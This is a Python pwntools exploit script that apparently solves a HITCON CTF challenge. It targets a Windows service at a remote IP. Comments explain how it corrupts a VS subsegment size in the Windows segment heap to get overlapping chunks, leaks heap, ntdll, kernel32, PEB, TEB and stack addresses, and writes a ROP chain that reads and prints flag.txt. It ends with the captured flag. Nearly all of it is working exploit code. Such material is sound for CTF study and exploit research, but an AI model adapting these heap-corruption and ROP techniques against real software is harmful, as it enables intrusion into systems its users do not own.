#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

def add(_type, _sz):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('storage:', str(_type))
    r.sendlineafter('Size:', str(_sz))

def set0(sidx, idx, val):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('index:', str(sidx))
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Value:', str(val))

def set1(sidx, idx, val):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('index:', str(sidx))
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Value:', str(val))

def set2(sidx, idx, val):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('index:', str(sidx))
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Value:', val)

def set3(sidx, sz, val):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('index:', str(sidx))
    r.sendlineafter('Size:', str(sz))
    r.sendafter('Value:', str(val))

def show(sidx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('index:', str(sidx))

def free(sidx):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('index:', str(sidx))

r = remote('52.198.180.107', 56746)

# Make #1 the target subsegment (each subsegment size is 0xffd0)
add(3, 0xff80) # 0
add(3, 0xff80) # 1
add(3, 0xff80) # 2

free(1)

# Create a layout so that a Type3 storage buf pointer is located behind the buf (#4)
fake_size = 0xdf80
add(3, fake_size) # 1
add(3, 0x10) # 3
add(3, 0x200) # 4
add(3, 0x10) # 5
add(3, 0x10) # 6
add(1, 1) # 7

free(4)
free(6)
add(3, 0x200) # 4

# Change the VS subsegment size into smaller fake_size
fake_size_s4 = (fake_size+0x50) >> 4
sig = (((fake_size_s4 ^ 0xABED) & 0x7fff) << 16) | fake_size_s4 # 15 bit signature = size ^ 0xABED
fake_idx = (fake_size + 0x3f8) / 8
fake_idx *= -1
set1(7, fake_idx, sig)
set1(7, fake_idx-2, 0xffff) # Note that bitmap must correct, if not the whole subsegment will be munmapped

# VS Subsegment will be freed if all the allocated blocks are freed by checking the VS Subsegment size == coalesce block size
# Since we change the VS subsegment size into fake_size, freeing #1 will free the whole VS subsegment even tho we only free fake_size chunk
free(1)

# Create overlapped chunk, we can use #4 to leak heap address
add(3, 0x6000) # 1
add(3, 0x6000) # 6
add(3, 0x1fe0) # 8

set1(7, -99, 0x4141414141414141)
show(4)
r.recvuntil('A'*8)
heap = u64(r.recv(6).ljust(8, '\x00')) - 0x203d9
log.success('heap: ' + hex(heap))

# leak everything else
set1(7, -12, heap+8)
show(4)
r.recvuntil('Value:')
offset = u64(r.recvline().strip().ljust(8, '\x00'))
log.success('offset: ' + hex(offset))

segment_heap_base = (heap ^ offset) - 0x2a0
log.success('segment_heap_base: ' + hex(segment_heap_base))

set1(7, -12, segment_heap_base+0x370)
show(4)
r.recvuntil('Value:')
ntdll = u64(r.recvline().strip().ljust(8, '\x00')) - 0x120780
log.success('ntdll: ' + hex(ntdll))

set1(7, -12, ntdll+0x16b428)
show(4)
r.recvuntil('Value:')
PEB = u64(r.recvline().strip().ljust(8, '\x00')) & 0xfffffff000
log.success('PEB: ' + hex(PEB))

set1(7, -12, PEB+0x12)
show(4)
r.recvuntil('Value:')
code = u64(('\x00\x00'+r.recvline().strip()).ljust(8, '\x00'))
log.success('code: ' + hex(code))

set1(7, -12, code+0x3000)
show(4)
r.recvuntil('Value:')
kernel32 = u64(r.recvline().strip().ljust(8, '\x00')) - 0x24ee0
log.success('kernel32: ' + hex(kernel32))

TEB = PEB + 0x1000
log.success('TEB: ' + hex(TEB))

set1(7, -12, TEB+0xa)
show(4)
r.recvuntil('Value:')
stack = u64(('\x00\x00'+r.recvline().strip()).ljust(8, '\x00'))
log.success('stack: ' + hex(stack))

ret_code_address = code + 0x209c
for i in range(1, 300):
    set1(7, -12, stack-8*i)
    show(4)
    r.recvuntil('Value:')
    tmp = u64(r.recvline().strip().ljust(8, '\x00'))
    log.info('tmp: ' + hex(tmp))
    if tmp == ret_code_address:
        ret_address = stack-8*i
        log.success('ret_address: ' + hex(ret_address))
        break

# This ROP is modified from https://github.com/leesh3288/CTF/blob/master/2020/CODEGATE_2020_Finals/winsanity/exploit_writeup/exploit.py
ret = ntdll + 0x5f45
pop_rax = ntdll + 0x5f44
pop_rcx = ntdll + 0x8dd2f
pop_rdx_r11 = ntdll + 0x8b6e7
pop_r9_r10_r11 = ntdll + 0x8b6e4
pop_r8_r9_r10_r11 = ntdll + 0x8b6e2
pop_rcx_r8_r9_r10_r11 = ntdll + 0x8b6e1
mov_drcx_rax = ntdll + 0x78913
xor_r8 = ntdll + 0x8ed31

buf = code + 0x5a00

OpenFile = kernel32 + 0x61300
ReadFile = kernel32 + 0x24ee0
WriteFile = kernel32 + 0x24fd0
GetStdHandle = kernel32 + 0x1d490
Sleep = kernel32 + 0x1ada0

payload = [
    pop_rax,
    u64("xt\0\0\0\0\0\0"),
    pop_rcx,
    buf + 0x308,
    mov_drcx_rax,
    pop_rax,
    u64(".\\flag.t"),
    pop_rcx,
    buf + 0x300,
    mov_drcx_rax,
    pop_rdx_r11,
    buf + 0x000,
    0,
    xor_r8,
    ret,
    OpenFile,
    pop_rcx_r8_r9_r10_r11,
    0,
    0,
    0,
    0,
    0,
    pop_rcx,
    ret_address + 0x24 * 8 - 10*8,
    mov_drcx_rax,
    pop_rcx,
    0,
    pop_rdx_r11,
    buf + 0x100,
    0,
    pop_r8_r9_r10_r11,
    0x100,
    buf + 0x200,
    0,
    0,
    ReadFile,
    pop_rcx_r8_r9_r10_r11,
    0,
    0,
    0,
    0,
    0,
    ret,
    pop_rcx,
    (-11 & 0xffffffff),
    GetStdHandle,
    pop_rcx,
    ret_address + 0x3c * 8 - 10*8,
    mov_drcx_rax,
    pop_rcx,
    0,
    pop_rdx_r11,
    buf + 0x100,
    0,
    pop_r8_r9_r10_r11,
    0x100,
    buf + 0x200,
    0,
    0,
    WriteFile,
    # pop_rcx_r8_r9_r10_r11,
    # 0,
    # 0,
    # 0,
    # 0,
    # 0,
    # ret,
    pop_rcx,
    0xffffffff,
    Sleep,
]

payload = flat(payload)

set1(7, -12, ret_address)
set3(4, 0x1f8, payload)

r.interactive()

# hitcon{S3gm3nt_H34p_1s_th3_h34ven_F34l_4_u}
